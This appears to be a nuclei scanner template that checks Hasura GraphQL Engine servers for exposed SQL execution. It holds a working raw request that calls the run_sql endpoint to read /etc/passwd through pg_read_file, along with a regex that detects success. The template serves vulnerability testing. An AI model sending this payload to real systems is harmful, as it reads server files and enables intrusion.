id: hasura-graphql-psql-exec

info:
  author: Udyz
  name: Hasura GraphQL Engine - postgresql query exec
  severity: critical
  reference: https://github.com/projectdiscovery/nuclei-templates/blob/53bed168cce5619e18b991c56779d4ce31ce153f/vulnerabilities/other/hasura-graphql-ssrf.yaml
  tags: hasura,rce

requests:
  - raw:
      - |
        POST /v2/query HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "type": "bulk",
          "source": "default",
          "args":[
            {
              "type": "run_sql",
              "args": {
                "source":"default",
                "sql":"SELECT pg_read_file('/etc/passwd',0,100000);",
                "cascade": false,
                "read_only": false
              }
            }
          ]
        }
        
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
